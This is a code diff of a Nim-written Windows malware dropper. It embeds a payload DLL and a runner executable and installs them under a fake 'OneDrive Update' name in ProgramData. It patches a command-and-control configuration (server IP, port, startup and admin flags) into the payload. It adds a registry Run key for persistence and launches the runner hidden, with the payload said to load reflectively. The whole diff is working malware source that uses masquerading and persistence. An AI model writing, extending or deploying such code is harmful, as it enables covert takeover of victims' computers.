@@ -1,18 +1,15 @@
 ﻿import winim
 import std/os
 
-# Configuration placeholders (patched by Builder)
 const
-    InstallDir* = r"%USERPROFILE%\AppData\Local\Microsoft\OneDrive\Update"
-    ExeName* = "OneDrive Update.exe"
-    DatName* = "payload.dat" # Changed from payload.dll
+    MAX_PATH_LEN = 260
+    ConfigMark = "FRMD26_CONFIG"
+    DllName* = "payload.dll"
 
-# We now embed the DLL binary directly
 const 
-    PayloadBin = staticRead("payload_build.dll") 
+    PayloadBin = staticRead("payload_build.dll")
     RunnerBin = staticRead("runner_build.exe")
 
-# 转换为字节数组以规避 C 编译器字符串限制
 const 
     PayloadBytes: array[PayloadBin.len, byte] = (
         var arr: array[PayloadBin.len, byte]
@@ -25,49 +22,105 @@ const
         arr
     )
 
-const
-    # Configuration Flags
-    ConfigMark = "FRMD26_CONFIG"
-    # 0 or 1 chars
-    CfgInstall = '1'
-    CfgStartup = '1'
-    CfgTask    = '1'
-    CfgService = '0'
+type
+    CONNECT_ADDRESS* {.packed.} = object
+        szFlag*: array[32, char]
+        szServerIP*: array[100, char]
+        szPort*: array[8, char]
+        iType*: int32
+        bEncrypt*: int32
+        szBuildDate*: array[12, char]
+        iMultiOpen*: int32
+        iStartup*: int32
+        iHeaderEnc*: int32
+        protoType*: char
+        runningType*: char
+        payloadType*: char
+        szGroupName*: array[24, char]
+        runasAdmin*: char
+        szInstallDir*: array[MAX_PATH_LEN, char]
+        szInstallName*: array[MAX_PATH_LEN, char]
+        szDownloadUrl*: array[512, char]
+        taskStartup*: char
+        serviceStartup*: char
+        registryStartup*: char
+        iPumpSize*: int32
+        szReserved*: array[3, char]
+        clientID*: uint64
+        parentHwnd*: uint64
+        superAdmin*: uint64
+        pwdHash*: array[64, char]
+
+proc toCharArray[N: static[int]](s: string): array[N, char] =
+    for i in 0 ..< min(s.len, N):
+        result[i] = s[i]
+
+var g_ServerConfig* {.exportc, used.} = CONNECT_ADDRESS(
+    szFlag: toCharArray[32](ConfigMark),
+    szServerIP: toCharArray[100]("127.0.0.1"),
+    szPort: toCharArray[8]("8080"),
+    iType: 0,
+    bEncrypt: 0,
+    szBuildDate: toCharArray[12]("2026-02-10"),
+    iMultiOpen: 1,
+    iStartup: 1,
+    iHeaderEnc: 1,
+    protoType: 0.char,
+    runningType: 0.char,
+    payloadType: 0.char,
+    szGroupName: toCharArray[24]("Default"),
+    runasAdmin: 1.char,
+    szInstallDir: toCharArray[MAX_PATH_LEN](r"%ProgramData%\Microsoft OneDrive"),
+    szInstallName: toCharArray[MAX_PATH_LEN]("OneDrive Update.exe"),
+    szDownloadUrl: toCharArray[512](""),
+    taskStartup: 1.char,
+    serviceStartup: 0.char,
+    registryStartup: 1.char,
+    iPumpSize: 0,
+    clientID: 0,
+    parentHwnd: 0,
+    superAdmin: 0
+)
 
 proc main() =
-    # 1. Resolve Install Directory
     var szExpanded: array[MAX_PATH, char]
-    ExpandEnvironmentStringsA(InstallDir.cstring, addr szExpanded[0], MAX_PATH)
+    let installDirCfg = $cast[cstring](addr g_ServerConfig.szInstallDir[0])
+    ExpandEnvironmentStringsA(installDirCfg.cstring, addr szExpanded[0], MAX_PATH)
     let resolvedDir = $cast[cstring](addr szExpanded[0])
 
-    # 2. Create Directory
     try:
         createDir(resolvedDir)
     except:
         discard
 
-    let exePath = resolvedDir & "\\" & ExeName
-    let datPath = resolvedDir & "\\" & DatName
+    let exeNameCfg = $cast[cstring](addr g_ServerConfig.szInstallName[0])
+    let exePath = resolvedDir & "\\" & exeNameCfg
+    let dllPath = resolvedDir & "\\" & DllName
 
-    # 3. Drop Files
     try:
-        # 这种方式会强制 Nim 编译器按字节处理，而不是生成 C 字符串字面量
         writeFile(exePath, RunnerBytes)
-        writeFile(datPath, PayloadBytes)
+        var payloadData = newString(PayloadBytes.len)
+        if PayloadBytes.len > 0:
+            copyMem(addr payloadData[0], unsafeAddr PayloadBytes[0], PayloadBytes.len)
+            let marker = ConfigMark
+            let markerLen = marker.len
+            let maxPos = payloadData.len - sizeof(CONNECT_ADDRESS)
+            for i in 0 ..< maxPos:
+                if cmpMem(unsafeAddr payloadData[i], marker.cstring, markerLen) == 0:
+                    let pAddr = cast[ptr CONNECT_ADDRESS](addr payloadData[i])
+                    copyMem(pAddr, addr g_ServerConfig, sizeof(CONNECT_ADDRESS))
+                    break
+        writeFile(dllPath, payloadData)
     except:
         discard
 
-    # 4. Persistence (Registry Run) - Only if CfgStartup is '1'
     var hKey: HKEY
-    if RegOpenKeyExA(HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_SET_VALUE, addr hKey) == ERROR_SUCCESS:
+    if g_ServerConfig.registryStartup != 0.char and RegOpenKeyExA(HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_SET_VALUE, addr hKey) == ERROR_SUCCESS:
         let valName = "OneDrive Update"
         let valData = "\"" & exePath & "\"" 
-        # Fix: Use cstring conversion for the data pointer
         RegSetValueExA(hKey, valName, 0, REG_SZ, cast[ptr BYTE](valData.cstring), DWORD(valData.len + 1))
         RegCloseKey(hKey)
 
-    # 5. Execute Runner
-    # We execute the dropped EXE, which will then load payload.dat reflectively
     let cmd = "\"" & exePath & "\""
     WinExec(cmd.cstring, SW_HIDE)
 
